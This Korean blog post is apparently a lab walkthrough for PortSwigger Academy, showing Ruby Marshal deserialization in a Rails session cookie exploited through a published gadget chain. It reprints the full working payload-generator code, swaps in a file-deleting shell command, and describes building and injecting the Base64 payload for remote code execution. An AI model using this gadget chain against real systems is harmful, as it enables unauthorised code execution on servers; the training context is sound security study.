---
title: Insecure Deserialization 실습(7) - Ruby Gadget Chain을 이용한 RCE (PortSwigger Academy)
description: Ruby Marshal 기반 session과 documented gadget chain을 활용하여 RCE를 발생시키는 과정 정리
categories: [Web Security, Deserialization, Lab]
tags: [웹 보안, 실습, PortSwigger Academy]
toc: true
---

# Lab: Exploiting Ruby deserialization using a documented gadget chain

Lab Link: [Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)

---

## 핵심 포인트

이 lab은 다음 개념들이 결합되어 있다.

- Ruby Marshal serialization  
- gadget chain  
- documented exploit 활용  
- 코드 수정 기반 RCE  

ysoserial이나 PHPGGC를 사용하지않고 이미 공개된 Exploit을 활용해 Lab을 풀어보자

---

## 실습 흐름

### 1. 로그인 및 Framework 식별

로그인 후 요청을 보면 session cookie가 존재한다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-0.png" alt="설명" width="800">
</div>

해당 값을 Base64로 디코딩하면  
`\x04\x08`로 시작하는 것을 확인할 수 있다.  

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-1.png" alt="설명" width="800">
</div>

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-2.png" alt="설명" width="800">
</div>

> Source: [CyberChef](https://gchq.github.io/CyberChef/)

이는 Ruby에서 사용하는 **Marshal serialization signature**이며,  
session 값이 Ruby 객체 형태로 직렬화되어 저장되어 있음을 의미한다.

또한 lab 설명에서 해당 애플리케이션이  
**Ruby on Rails framework**를 사용한다는 점이 명시되어 있다.

---

### 2. 취약점 판단

session cookie가 Ruby Marshal 형태로 저장되어 있다는 점에서,  
서버는 해당 값을 역직렬화하여 내부 객체로 복원하고 있을 가능성이 높다.

실제로 session 값을 임의로 변경하거나 일부를 제거하면 에러가 발생하며,  
이는 서버가 해당 값을 단순 저장이 아닌 실제로 파싱하고 사용하고 있음을 의미한다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-3.png" alt="설명" width="800">
</div>

따라서 다음과 같은 흐름을 추론할 수 있다.

`user input → Marshal.load() → 객체 복원`

이 과정에서 사용자 입력이 그대로 역직렬화되기 때문에,  
malicious object를 주입할 경우 코드 실행으로 이어질 수 있다.

---

### 3. Exploit 전략

이번 lab에서는 이미 공개된 **Ruby gadget chain exploit**을 활용한다.

관련 자료를 검색해보면 다양한 exploit이 존재하지만,  
다음 글을 참고하여 진행하였다.

devcraft.io: [Universal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

해당 write-up에서는 **pbctf2020**에 출제된 Rails 기반 애플리케이션을 다루며,  
Ruby 2.7.2와 Rails 6.1 환경에서 동작하는 gadget chain을 분석한다.

exploit 코드를 처음부터 완전히 이해하기는 아직 어렵지만,  
전체 흐름을 기준으로 보면 다음과 같이 역할을 나눌 수 있다.

1. **Kick-off gadget**  
   역직렬화 직후 자동으로 실행되며, 전체 gadget chain의 시작점 역할을 한다.  
   - `Gem::Requirement`

2. **Dispatcher / Flow control gadget**  
   내부적으로 다른 객체의 메서드를 호출하도록 유도하며, 코드 흐름을 다음 단계로 전달한다.  
   - `Gem::Package::TarReader`  
   - `Net::BufferedIO`

3. **Bridge gadget**  
   전달된 데이터를 기반으로 특정 객체의 메서드를 실행하도록 연결하는 역할을 한다.  
   - `Net::WriteAdapter`

4. **Sink gadget**  
   최종적으로 공격자가 원하는 동작을 수행하는 지점이다.  
   - `Kernel.system`

해당 exploit은 RubyGems 및 표준 라이브러리 내부 클래스들의 호출 관계를 기반으로 구성되어 있으며,  
역직렬화 시 자동으로 실행되는 객체를 시작점으로 삼아 호출 흐름을 조작한다.

`Gem::Requirement` → `Gem::Package::TarReader` → `Net::BufferedIO` → `Net::WriteAdapter`

와 같은 체인을 통해 내부 메서드 호출을 이어가고,  
최종적으로 `Kernel.system`까지 도달하도록 설계되어 있다.

또한 이 exploit은 Ruby 2.x–3.x 환경에서 동작하는 것으로 알려져 있으며,  
특히 저자는 Ruby 3.0.2 이하 버전에서만 동작한다고 한다.

따라서 본 lab에서도 정확한 버전이 명시되어 있지는 않지만,  
Ruby Marshal 기반 session 구조가 확인되는 시점에서  
해당 gadget chain을 적용할 수 있다고 판단하였다.

---

### 4. Exploit 코드

위 writeup에서는 다음의 코드를 소개한다:

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

여기서 우리가 변경해야 할 부분은
```ruby
rs.instance_variable_set('@git_set', "id")
```
여기서의 `"id"` 부분이며 우리가 실행하고싶은 command로 대체하면 된다  
→ `rm /home/carlos/morale.txt` 

또한, 마지막 payload는 Base64로 인코딩을 해줘야 하기 때문에  
마지막 두 줄은 `puts Base64.encode64(payload)` 으로 수정 해준다.

---

### 5. Ruby Compile

위 코드를 Compile 하려고 online compiler를 여러개 시도해 봤는데  
모두 동일한 에러를 동반하는것을 확인할 수 있었다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-4.png" alt="설명" width="600">
</div>

확인해보니 최신 Ruby 버전에서는 해당 exploit이 정상적으로 동작하지 않았는데,  
gadget chain이 이전 Ruby 버전에 의존하기 때문인걸로 확인된다.

로컬 환경과의 충돌을 방지하기 위해 Docker를 사용하여  
Ruby 2.7.2 환경에서 payload를 생성하였다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-5.png" alt="설명" width="700">
</div>

우선 Local에 Exploit 코드를 포함한 `exploit.rb` 파일을 저장해주고  
docker로 로컬 파일을 마운트 해준 후에 진행 했다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-6.png" alt="설명" width="800">
</div>

```bash
docker run -it -v C:\lab\ruby:/app ruby:2.7.2 /bin/bash
```

이후 `ruby exploit.rb`커맨드를 입력하면 성공적으로 컴파일링 되는걸 확인할 수 있다.  
뉴라인을 제외하기 위해서 {% raw %}`| tr -d "\r\n"`{% endraw %}을 함께 진행해주면 복붙하기 더 편해진다.  

해당 결과를 `output.txt`로 저장해서 복사 한 후에  
`Cookie:Session`값에 넣어주고 요청을 보내면 Lab이 해결된다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab7-7.png" alt="설명" width="700">
</div>

> Cookie-Editor로 session값 변경

---

## 정리
 
이처럼 공개된 gadget chain만으로도 RCE로 이어질 수 있다. 자동화 도구(ysoserial, PHPGGC)에 의존하지 않더라도, 공개된 exploit을 이해하고 환경에 맞게 적용하는 것만으로도 충분히 공격이 가능하다.